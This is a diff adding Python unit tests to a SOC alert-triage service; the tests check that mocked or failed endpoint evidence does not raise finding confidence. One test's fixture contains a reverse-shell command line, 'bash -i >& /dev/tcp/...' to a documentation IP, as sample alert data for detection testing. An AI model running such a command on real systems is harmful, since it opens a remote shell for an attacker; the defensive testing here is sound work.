@@ -8,6 +8,7 @@ from soc_agent.contracts import (
     AnalysisRun,
     AnalysisRunStatus,
     DetectionRuleRef,
+    InvestigationEvidence,
     SocDomainFindingDisposition,
     SocDomainName,
     SocDomainTriageRequest,
@@ -71,3 +72,113 @@ def test_domain_triage_uses_internal_scenario_when_keyword_matches() -> None:
     scenario_keys = {finding.scenario_key for finding in result.findings if finding.scenario_key}
     assert "execution.reverse_shell" in scenario_keys
     assert "vendor.unmapped" not in scenario_keys
+
+
+def test_domain_triage_does_not_treat_mock_or_failed_evidence_as_authoritative() -> None:
+    alert = AlertInput(
+        alert_id="ALT-MOCK-EVIDENCE",
+        source=AlertSourceRef(source_type=AlertSourceType.EDR),
+        detection=DetectionRuleRef(rule_name="Endpoint process alert"),
+    )
+    run = AnalysisRun(
+        run_id="RUN-MOCK-EVIDENCE",
+        alert_id=alert.alert_id,
+        status=AnalysisRunStatus.NEEDS_REVIEW,
+        input_payload=alert.model_dump(mode="json"),
+    )
+    evidence = [
+        InvestigationEvidence(
+            evidence_id="EVI-MOCK",
+            route="endpoint.process_tree.lookup",
+            action="endpoint.process_tree.lookup",
+            status="success",
+            message="mock process tree",
+            mocked=True,
+            result_payload={
+                "process_tree_found": True,
+                "process_tree": {"processes": [{"risk_tags": ["credential_access"]}]},
+            },
+        ),
+        InvestigationEvidence(
+            evidence_id="EVI-FAILED",
+            route="endpoint.process_tree.lookup",
+            action="endpoint.process_tree.lookup",
+            status="failed",
+            message="real provider failed",
+            result_payload={
+                "process_tree_found": True,
+                "process_tree": {"processes": [{"risk_tags": ["credential_access"]}]},
+            },
+        ),
+    ]
+
+    result = SocDomainTriageService().triage(
+        SocDomainTriageRequest(
+            run=run,
+            domain=SocDomainName.EDR,
+            investigation_evidence=evidence,
+        )
+    )
+
+    finding = result.findings[0]
+    assert finding.disposition is SocDomainFindingDisposition.NEEDS_MORE_EVIDENCE
+    assert finding.confidence == 0.5
+    assert finding.evidence_refs == ["EVI-MOCK"]
+    assert finding.metadata["risk_tags"] == []
+    assert finding.metadata["mock_evidence_count"] == 1
+    assert finding.evidence_profile.sources["mock_action_evidence"] == "available"
+    assert finding.evidence_profile.sources["read_only_action_evidence"] == "missing"
+
+
+def test_scenario_confidence_only_uses_successful_non_mock_evidence() -> None:
+    alert = AlertInput(
+        alert_id="ALT-REVERSE-SHELL-EVIDENCE",
+        source=AlertSourceRef(source_type=AlertSourceType.EDR),
+        detection=DetectionRuleRef(rule_name="Reverse shell behavior"),
+        raw={"message": "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"},
+    )
+    run = AnalysisRun(
+        run_id="RUN-REVERSE-SHELL-EVIDENCE",
+        alert_id=alert.alert_id,
+        status=AnalysisRunStatus.NEEDS_REVIEW,
+        input_payload=alert.model_dump(mode="json"),
+    )
+    mock_evidence = InvestigationEvidence(
+        evidence_id="EVI-MOCK-PROCESS-TREE",
+        route="endpoint.process_tree.lookup",
+        action="endpoint.process_tree.lookup",
+        status="success",
+        message="mock process tree",
+        mocked=True,
+        result_payload={"process_tree_found": True},
+    )
+    real_evidence = mock_evidence.model_copy(
+        update={
+            "evidence_id": "EVI-REAL-PROCESS-TREE",
+            "message": "real process tree",
+            "mocked": False,
+        }
+    )
+
+    without_evidence = SocDomainTriageService().triage(SocDomainTriageRequest(run=run, domain=SocDomainName.EDR))
+    with_mock = SocDomainTriageService().triage(
+        SocDomainTriageRequest(
+            run=run,
+            domain=SocDomainName.EDR,
+            investigation_evidence=[mock_evidence],
+        )
+    )
+    with_real = SocDomainTriageService().triage(
+        SocDomainTriageRequest(
+            run=run,
+            domain=SocDomainName.EDR,
+            investigation_evidence=[real_evidence],
+        )
+    )
+
+    baseline = next(item for item in without_evidence.findings if item.scenario_key == "execution.reverse_shell")
+    mocked = next(item for item in with_mock.findings if item.scenario_key == "execution.reverse_shell")
+    authoritative = next(item for item in with_real.findings if item.scenario_key == "execution.reverse_shell")
+    assert mocked.confidence == baseline.confidence
+    assert "EVI-MOCK-PROCESS-TREE" in mocked.evidence_refs
+    assert authoritative.confidence > mocked.confidence
